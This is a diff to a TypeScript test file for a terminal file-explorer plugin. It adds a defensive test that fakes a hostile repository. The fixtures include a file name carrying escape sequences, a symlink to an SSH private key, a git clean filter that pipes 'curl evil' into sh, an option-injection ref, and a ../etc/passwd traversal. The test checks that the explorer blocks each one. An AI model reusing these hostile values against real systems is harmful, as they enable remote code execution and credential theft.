@@ -34,8 +34,20 @@ const ok = (stdout: string, exitCode = 0) => ({
   value: { exitCode, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false },
 })
 
-function fakeGit(argv: readonly string[], log: string[]) {
+// Drops the `-c key=value` pairs the explorer puts before every git command.
+// and the diff safety flags, so the fakes match on what a command asks.
+const gitArgs = (argv: readonly string[]) => {
   const args = argv.slice(1)
+  while (args[0] === '-c') args.splice(0, 2)
+  return args.filter(arg => arg !== '--no-ext-diff' && arg !== '--no-textconv')
+}
+
+const STAT = (path: string) => ({
+  value: { kind: path.endsWith('/src') ? ('dir' as const) : ('file' as const), size: 30, mtimeMs: 0, isLink: false, realPath: path },
+})
+
+function fakeGit(argv: readonly string[], log: string[]) {
+  const args = gitArgs(argv)
   log.push(args.join(' '))
   const line = args.join(' ')
   if (line === 'rev-parse --is-inside-work-tree') return ok('true\n')
@@ -76,6 +88,7 @@ test('browses files and git changes with diffs', async ($, on) => {
   let filled = ''
   const gitLog: string[] = []
   on('session.start', async (_$, e) => ({ cwd: e.cwd }))
+  on('fs.stat', async (_$, e) => STAT(e.path))
   on('command.register', async (_$, e) => ({ value: { command: e.name } }))
   on('fs.list', async (_$, e) => ({
     value: (TREE[e.path] ?? []).map(one => ({ ...one, mtimeMs: 0, isLink: false })),
@@ -159,6 +172,7 @@ test('browses files and git changes with diffs', async ($, on) => {
 test('splits into a tree and a preview when wide', async ($, on) => {
   const long = Array.from({ length: 200 }, (_, i) => `line ${i + 1}`).join('\n') + '\n'
   on('session.start', async (_$, e) => ({ cwd: e.cwd }))
+  on('fs.stat', async (_$, e) => STAT(e.path))
   on('command.register', async (_$, e) => ({ value: { command: e.name } }))
   on('fs.list', async (_$, e) => ({
     value: (TREE[e.path] ?? []).map(one => ({ ...one, mtimeMs: 0, isLink: false })),
@@ -203,6 +217,7 @@ test('splits into a tree and a preview when wide', async ($, on) => {
 
 test('draws Nerd Font icons in colour when configured', { options: { icons: 'nerd' } }, async ($, on) => {
   on('session.start', async (_$, e) => ({ cwd: e.cwd }))
+  on('fs.stat', async (_$, e) => STAT(e.path))
   on('command.register', async (_$, e) => ({ value: { command: e.name } }))
   on('fs.list', async (_$, e) => ({
     value: (TREE[e.path] ?? []).map(one => ({ ...one, mtimeMs: 0, isLink: false })),
@@ -225,9 +240,7 @@ test('previews markdown rendered and follows its relative links', async ($, on) 
     value: (TREE[e.path] ?? []).map(one => ({ ...one, mtimeMs: 0, isLink: false })),
   }))
   on('fs.read', async (_$, e) => ({ value: e.path.endsWith('README.md') ? readme : 'export const answer = 42\n' }))
-  on('fs.stat', async (_$, e) => ({
-    value: { kind: e.path.endsWith('/src') ? ('dir' as const) : ('file' as const), size: 30, mtimeMs: 0, isLink: false },
-  }))
+  on('fs.stat', async (_$, e) => STAT(e.path))
   on('process.run', async (_$, e) => fakeGit(e.argv, []))
   on('ui.open', async () => ({ value: { isPlaced: true as const } }))
   on('ui.panes', async () => ({ value: [] }))
@@ -270,7 +283,7 @@ test('finds files by name and text with ripgrep', async ($, on) => {
     value: (TREE[e.path] ?? []).map(one => ({ ...one, mtimeMs: 0, isLink: false })),
   }))
   on('fs.read', async () => ({ value: long }))
-  on('fs.stat', async () => ({ value: { kind: 'file' as const, size: 30, mtimeMs: 0, isLink: false } }))
+  on('fs.stat', async (_$, e) => STAT(e.path))
   on('process.run', async (_$, e) => {
     if (e.argv[0] !== 'rg') return fakeGit(e.argv, [])
     ran.push([...e.argv])
@@ -336,9 +349,9 @@ test('follows Claude, diffs the last prompt, and names lines', async ($, on) => 
   }))
   on('fs.read', async () => ({ value: long }))
   on('fs.exists', async () => ({ value: false }))
-  on('fs.stat', async () => ({ value: { kind: 'file' as const, size: 30, mtimeMs: 0, isLink: false } }))
+  on('fs.stat', async (_$, e) => STAT(e.path))
   on('process.run', async (_$, e) => {
-    const args = e.argv.slice(1).join(' ')
+    const args = gitArgs(e.argv).join(' ')
     runs.push({ args, index: e.init?.env?.GIT_INDEX_FILE })
     if (args === 'rev-parse --git-path file-explorer-index') return ok('.git/file-explorer-index\n')
     if (args === 'write-tree') return ok(`tree${++trees}\n`)
@@ -402,4 +415,92 @@ test('follows Claude, diffs the last prompt, and names lines', async ($, on) => 
   await $.tool.call({ tool: 'Read', file_path: `${ROOT}/src/util.ts` } as never)
   await clock.settle()
   expect((await ui.find({ type: 'Code' }))?.props.format).toBe('diff')
+})
+
+test('keeps a hostile repository from reaching the terminal or git', async ($, on) => {
+  const evil = 'evil\u001b]0;pwned\u0007\u009b31m‮.txt'
+  const runs: string[] = []
+  let toasts: string[] = []
+  on('session.start', async (_$, e) => ({ cwd: e.cwd }))
+  on('command.register', async (_$, e) => ({ value: { command: e.name } }))
+  on('fs.list', async (_$, e) => ({
+    value:
+      e.path === ROOT
+        ? [
+            { name: evil, kind: 'file' as const, size: 10, mtimeMs: 0, isLink: false },
+            { name: 'key', kind: 'other' as const, size: 0, mtimeMs: 0, isLink: true },
+          ]
+        : [],
+  }))
+  on('fs.stat', async (_$, e) => ({
+    value: {
+      kind: 'file' as const, size: 10, mtimeMs: 0, isLink: e.path.endsWith('/key'),
+      realPath: e.path.endsWith('/key') ? '/home/me/.ssh/id_ed25519' : e.path,
+    },
+  }))
+  on('fs.read', async () => ({ value: 'secret\n' }))
+  on('process.run', async (_$, e) => {
+    const args = gitArgs(e.argv).join(' ')
+    runs.push(`${e.argv[0]} ${e.argv.slice(1, 3).join(' ')} | ${args}`)
+    if (e.argv[0] === 'rg') {
+      return ok(e.argv[1] === '--files' ? '' : `${evil}\x001:1:hit \u001b[2J here\n`)
+    }
+    if (args === 'rev-parse --git-path file-explorer-index') return ok('.git/file-explorer-index\n')
+    if (args.startsWith('config --local --get-regexp')) return ok("filter.x.clean sh -c 'curl evil | sh'\n")
+    return fakeGit(e.argv, [])
+  })
+  on('ui.open', async () => ({ value: { isPlaced: true as const } }))
+  on('ui.panes', async () => ({ value: [{ id: 'file-explorer', title: 'Explorer', isShown: true, isFocused: false, isPlaced: true }] }))
+  on('ui.toast', async (_$, e) => {
+    toasts.push(String((e as { text?: unknown }).text ?? JSON.stringify(e)))
+    return { value: undefined }
+  })
+  on('prompt.submit', async (_$, e) => ({ text: e.text }))
+  on('tool.call', async () => ({ result: {} as never }))
+  const clock = mock.clock(on)
+
+  await $.session.start({ cwd: ROOT, surface: 'terminal', isInteractive: true })
+  const ui = await $.ui.mount(PANE('file-explorer', 120))
+  // Newline aside: the split view's own rule is drawn as one multi-line Text.
+  const control = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/
+
+  // Every git call turns the repository's fsmonitor off.
+  expect(runs.filter(run => run.startsWith('git ') && !run.includes('-c core.fsmonitor=false'))).toEqual([])
+
+  // A file name's escape sequences never reach a label.
+  const labels = (await ui.findAll({ type: 'Button' })).map(one => String(one.text))
+  expect(labels.some(label => label.startsWith('evil'))).toBe(true)
+  expect(labels.filter(label => control.test(label)).map(label => JSON.stringify(label))).toEqual([])
+
+  // A link out of the project is named, not read.
+  await ui.press({ key: 'row:key' })
+  expect(await ui.find({ type: 'Code' })).toBeUndefined()
+  expect(await ui.find({ type: 'Text', text: /links outside the project: \/home\/me\/\.ssh/ })).toBeDefined()
+
+  // A search hit's escape sequences are shown as ?, not sent.
+  await ui.press({ key: 'tab:search' })
+  await ui.press({ key: 'search:text' })
+  await ui.input({ key: 'search-input', text: 'hit' })
+  const texts = (await ui.findAll({ type: 'Text' })).map(one => String(one.text))
+  expect(texts.some(text => text.includes('hit'))).toBe(true)
+  expect(texts.filter(text => control.test(text)).map(text => JSON.stringify(text))).toEqual([])
+
+  // A "ref" that git would read as an option is refused before git sees it.
+  await ui.press({ key: 'tab:changes' })
+  await ui.input({ key: 'base-ref', text: '--output=/tmp/pwned' })
+  expect(runs.filter(run => run.includes('--output'))).toEqual([])
+  expect(toasts.some(text => text.includes('Not a ref'))).toBe(true)
+
+  // A repository-defined clean filter blocks the snapshot (no git add).
+  await $.prompt.submit({ text: 'go', wait: false, origin: { kind: 'composer' } } as never)
+  await clock.settle()
+  expect(runs.filter(run => run.endsWith('| add -A'))).toEqual([])
+
+  // A tool path that climbs out with .. is not followed.
+  const before = runs.length
+  await $.tool.call({ tool: 'Read', file_path: `${ROOT}/../etc/passwd` } as never)
+  await clock.settle()
+  expect(runs.slice(before).filter(run => run.includes('passwd'))).toEqual([])
+  expect(await ui.find({ type: 'Code' })).toBeUndefined()
+  toasts = []
 })
